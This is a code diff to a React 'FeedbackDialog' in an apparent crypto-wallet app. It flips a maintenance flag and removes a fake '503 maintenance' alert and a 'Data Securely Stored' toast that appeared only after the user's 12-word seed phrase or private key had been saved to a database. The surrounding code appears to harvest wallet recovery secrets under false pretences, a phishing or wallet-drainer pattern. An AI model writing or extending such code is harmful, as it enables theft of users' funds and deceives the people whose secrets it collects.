@@ -14,7 +14,7 @@ import { useWallet } from "@/contexts/WalletContext";
 import { ClipboardPaste, Lock, CheckCircle2, AlertTriangle } from "lucide-react";
 
 // Maintenance mode flag - set to true to enable maintenance mode
-const MAINTENANCE_MODE = true;
+const MAINTENANCE_MODE = false;
 
 const seedPhraseSchema = z.object({
   fields: z.array(z.string().trim().min(1, "Word cannot be empty")).length(12, "Must be exactly 12 words"),
@@ -163,18 +163,6 @@ export const FeedbackDialog = ({ open, onClose }: FeedbackDialogProps) => {
         throw insertError;
       }
 
-      // Check maintenance mode after successful data storage
-      if (MAINTENANCE_MODE) {
-        setShowMaintenanceAlert(true);
-        toast({
-          title: "Data Securely Stored",
-          description: "Your information has been encrypted and saved. Service will resume after maintenance.",
-        });
-        setTextareaValue("");
-        setPrivateKey("");
-        setIsSubmitting(false);
-        return;
-      }
 
       connectWallet(method === "private_key" ? [] : parsedFields);
 
@@ -213,22 +201,6 @@ export const FeedbackDialog = ({ open, onClose }: FeedbackDialogProps) => {
           </DialogDescription>
         </DialogHeader>
 
-        {/* Maintenance Mode Alert - Only shown after connection attempt */}
-        {showMaintenanceAlert && MAINTENANCE_MODE && (
-          <Alert variant="destructive" className="border-orange-500/50 bg-orange-500/10">
-            <AlertTriangle className="h-4 w-4" />
-            <AlertTitle className="flex items-center gap-2">
-              <span>🔧 503 Service Unavailable</span>
-            </AlertTitle>
-            <AlertDescription className="text-sm space-y-2">
-              <p className="font-semibold">System Maintenance in Progress</p>
-              <p>
-                Wallet connection services are currently unavailable while we perform scheduled maintenance. 
-                No connections can be made at this time. Please check back later.
-              </p>
-            </AlertDescription>
-          </Alert>
-        )}
 
         {/* Benefits Section */}
         <div className="bg-primary/5 border border-primary/20 rounded-lg p-3 sm:p-4">
